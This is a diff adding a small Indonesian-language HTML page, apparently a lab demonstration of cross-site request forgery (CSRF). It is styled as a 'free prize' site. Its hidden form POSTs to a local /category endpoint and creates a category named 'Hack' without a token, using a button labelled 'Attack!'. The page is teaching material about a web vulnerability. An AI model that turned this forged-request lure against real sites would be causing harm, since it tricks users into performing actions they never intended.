@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Website Hadiah Gratis (Simulasi Hacker)</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                text-align: center;
+                margin-top: 50px;
+            }
+            .box {
+                border: 2px dashed red;
+                padding: 20px;
+                display: inline-block;
+                background-color: #fee;
+            }
+            button {
+                background: green;
+                color: white;
+                padding: 10px 20px;
+                border: none;
+                cursor: pointer;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="box">
+            <h2>Simulasi Serangan CSRF</h2>
+            <p>Klik tombol di bawah ini untuk melakukan serangan.</p>
+
+            <form action="http://127.0.0.1:8000/category" method="POST">
+                <input type="hidden" name="name" value="Hack" />
+                <input
+                    type="hidden"
+                    name="description"
+                    value="Serangan CSRF tanpa token resmi"
+                />
+
+                <button type="submit">Serang!</button>
+            </form>
+        </div>
+    </body>
+</html>
